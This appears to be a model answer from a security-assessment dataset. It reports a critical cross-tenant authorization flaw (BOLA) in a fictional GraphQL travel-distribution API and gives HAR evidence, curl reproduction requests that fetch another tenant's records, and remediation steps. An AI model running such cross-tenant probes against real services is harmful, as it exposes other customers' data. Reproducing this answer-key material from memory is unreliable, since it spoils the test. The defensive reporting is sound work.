# Expected Response

## System
- Domain: Travel / Distribution
- System: SkyPort Global Distribution
- Example ID: GQL-0068

## Priority Findings

### Finding 1: Cross-Tenant Booking/Resource BOLA via Related Linked Resources (Pattern 1.2)
**Severity:** Critical
**Category:** BOLA

**Summary:**
Per §5.0 (Pattern 1.2 — related or linked resources): "The resolver handling `resourceId` does not enforce ownership or tenancy boundaries." An attacker from `tenant-61f1` used `bulkResourceLookup` to retrieve travel distribution resources (`R-2068`, `R-1068`, `R-3068`) belonging to `tenant-60f9`. In a travel GDS platform, these records may include booking configurations, partner pricing, and PII travel records.

**Evidence from HAR:**
- Request: `POST https://api.skyport-global-dist.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-61f1`
- Mutation: `bulkResourceLookup(ids: ["R-2068", "R-1068", "R-3068"]) { resourceId tenantId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-60f9"`, `ownerId: "other-user-61f160f9"`, `sensitiveField: "CONFIDENTIAL-61f160f9"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-61f160f9`

**Root Cause (§4.0 RISK-GQL-068):** `getResource` / `bulkResourceLookup` resolve by ID only; related/linked resource traversal not bounded by tenantId.

## Steps to Reproduce

### Step 1 — Bulk linked resource access (HAR)
```bash
curl -s -X POST https://api.skyport-global-dist.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-61f1" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2068\", \"R-1068\", \"R-3068\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-61f160f9` from `tenant-60f9`. **Secure:** FORBIDDEN.

### Step 2 — Access related child items via getResourceWithChildren
```bash
curl -s -X POST https://api.skyport-global-dist.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-61f1" \
  -d '{"query": "query { getResourceWithChildren(id: \"R-2068\") { resourceId tenantId items { resourceId tenantId } } }"}'
```
**Vulnerable:** Traverses linked child resources across tenant boundaries.

## Remediation
1. Per-ID ownership filter in `bulkResourceLookup`: reject any ID whose tenantId != JWT.tenantId.
2. Resolver tenant guard on `getResource` and `getResourceWithChildren`.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
